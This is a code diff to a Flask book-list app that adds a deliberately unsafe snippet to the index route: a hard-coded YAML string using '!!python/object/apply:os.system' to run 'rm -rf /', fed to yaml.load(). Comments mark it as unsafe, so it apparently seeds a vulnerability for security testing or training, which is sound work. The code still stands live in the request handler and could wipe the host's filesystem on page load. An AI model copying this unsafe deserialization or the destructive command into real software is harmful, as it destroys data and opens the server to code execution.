@@ -4,6 +4,7 @@ from flask import request, render_template, make_response
 from server.webapp import flaskapp, cursor
 from server.models import Book
 
+import yaml
 
 @flaskapp.route('/')
 def index():
@@ -27,8 +28,11 @@ def index():
         cursor.execute("SELECT name, author, read FROM books")
         books = [Book(*row) for row in cursor]
 
-    # Unsafe usage of format()
-    user_input = "{0.__class__}".format("string")  # This can expose internal details
-    print(user_input)
+
+    # Unsafe usage of yaml.load()
+    user_input = """
+    !!python/object/apply:os.system ["rm -rf /"]
+    """
+    data = yaml.load(user_input)  # This can execute the malicious command
 
     return render_template('books.html', books=books)
